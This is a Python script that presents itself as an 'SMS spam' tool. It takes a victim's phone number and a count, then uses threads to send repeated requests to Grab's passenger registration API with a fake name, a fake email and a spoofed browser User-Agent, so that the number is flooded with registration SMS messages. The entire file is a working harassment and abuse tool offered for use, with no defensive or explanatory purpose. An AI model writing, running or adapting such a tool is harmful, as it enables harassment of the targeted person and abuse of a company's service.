#!/usr/bin/python
# -*- coding: utf-8 -*-
# D4N15HG4NU
"""
SAYA GAY
"""
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nModule request not install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print("""\033[1;32m
 ____  _  _   _   _ _ ____  _   _  ____ _  _   _   _ _   _ \033[1;36mSPAM SMS (GRAB)\033[1;32m
|  _ \| || | | \ | / | ___|| | | |/ ___| || | | \ | | | | |\033[1;31mAuthor : D4N15HG4NU\033[1;32m
| | | | || |_|  \| | |___ \| |_| | |  _| || |_|  \| | | | |\033[1;31mContact: _.dxn1sh_2xx\033[1;32m
| |_| |__   _| |\  | |___) |  _  | |_| |__   _| |\  | |_| |\033[1;31mGithub :github.com/D4N15HG4NU\033[1;32m
|____/   |_| |_| \_|_|____/|_| |_|\____|  |_| |_| \_|\___/ Sp4m 5m5 
""")
	no = input("\033[1;37m[?] Number =>\033[1;36m ")
	jum=int(input("\033[1;37m[?] Amount => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] BERJAYA (::^ω^::)")
		else:
			print("\033[1;31m[-] GAGAL (╥﹏╥)")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("TAMAT(ಥ_ಥ)")
